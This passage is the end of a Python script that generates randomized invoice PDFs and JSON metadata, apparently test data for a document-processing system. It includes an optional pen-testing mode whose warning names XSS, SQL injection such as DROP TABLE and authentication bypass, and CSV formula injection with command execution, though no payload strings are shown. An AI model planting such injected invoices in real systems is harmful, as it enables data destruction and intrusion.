        print(f"  - Rotation ratio: {rotation_ratio*100:.0f}%")
        print(f"  - Offset ratio: {offset_ratio*100:.0f}%")
        print()
        
        for i in range(count):
            entity_id = random.randint(1, 100000)
            document_id = random.randint(1, 100000)
            
            # Determine characteristics
            num_pages = random.randint(2, 4) if random.random() < multi_page_ratio else 1
            
            rotation = 0
            if random.random() < rotation_ratio:
                rotation = random.choice([-5, -4, -3, -2, -1, 1, 2, 3, 4, 5])
            
            offset_x = 0
            offset_y = 0
            if random.random() < offset_ratio:
                offset_x = random.uniform(-20, 20)
                offset_y = random.uniform(-20, 20)
            
            result = self.generate_invoice(
                entity_id=entity_id,
                document_id=document_id,
                num_pages=num_pages,
                rotation=rotation,
                offset_x=offset_x,
                offset_y=offset_y
            )
            
            results.append(result)
            
            print(f"[{i+1}/{count}] Generated invoice {result['invoice_data']['invoiceNumber']} "
                  f"(pages: {num_pages}, rotation: {rotation}°, offset: {offset_x:.1f},{offset_y:.1f})")
        
        # Create summary
        summary = {
            "total_generated": count,
            "output_directory": str(self.output_dir.absolute()),
            "pdf_directory": str(self.pdf_dir.absolute()),
            "json_directory": str(self.json_dir.absolute()),
            "generated_at": datetime.now().isoformat(),
            "invoices": [
                {
                    "invoice_number": r["invoice_data"]["invoiceNumber"],
                    "document_id": r["metadata"]["documentID"],
                    "pdf_file": Path(r["pdf_path"]).name,
                    "json_file": Path(r["json_path"]).name
                }
                for r in results
            ]
        }
        
        summary_path = self.output_dir / "generation_summary.json"
        with open(summary_path, "w") as f:
            json.dump(summary, f, indent=2)
        
        print()
        print(f"✓ Generation complete!")
        print(f"  - PDFs: {self.pdf_dir}")
        print(f"  - JSON: {self.json_dir}")
        print(f"  - Summary: {summary_path}")
        
        return results


def main():
    parser = argparse.ArgumentParser(
        description="Generate randomized financial invoice PDFs with metadata"
    )
    parser.add_argument(
        "-n", "--count",
        type=int,
        default=10,
        help="Number of invoices to generate (default: 10)"
    )
    parser.add_argument(
        "-o", "--output",
        type=str,
        default="generated_invoices",
        help="Output directory (default: generated_invoices)"
    )
    parser.add_argument(
        "--multi-page-ratio",
        type=float,
        default=0.3,
        help="Ratio of multi-page invoices (0.0-1.0, default: 0.3)"
    )
    parser.add_argument(
        "--rotation-ratio",
        type=float,
        default=0.2,
        help="Ratio of rotated invoices (0.0-1.0, default: 0.2)"
    )
    parser.add_argument(
        "--offset-ratio",
        type=float,
        default=0.2,
        help="Ratio of off-center invoices (0.0-1.0, default: 0.2)"
    )
    parser.add_argument(
        "--dangerous-html",
        action="store_true",
        help="Enable dangerous payload injection (HTML, SQL, CSV formulas) for pen testing (files will be labeled with '_dangerous_')"
    )
    
    args = parser.parse_args()
    
    if args.dangerous_html:
        print("⚠️  WARNING: Dangerous payload injection enabled for pen testing!")
        print("   - HTML injection (XSS, iframe, script tags)")
        print("   - SQL injection (UNION, DROP TABLE, authentication bypass)")
        print("   - CSV formula injection (Excel formulas, command execution)")
        print("   Files will be labeled with '_dangerous_' prefix")
        print()
    
    generator = InvoiceGenerator(output_dir=args.output, inject_dangerous_html=args.dangerous_html)
    generator.generate_batch(
        count=args.count,
        multi_page_ratio=args.multi_page_ratio,
        rotation_ratio=args.rotation_ratio,
        offset_ratio=args.offset_ratio
    )


if __name__ == "__main__":
    main()
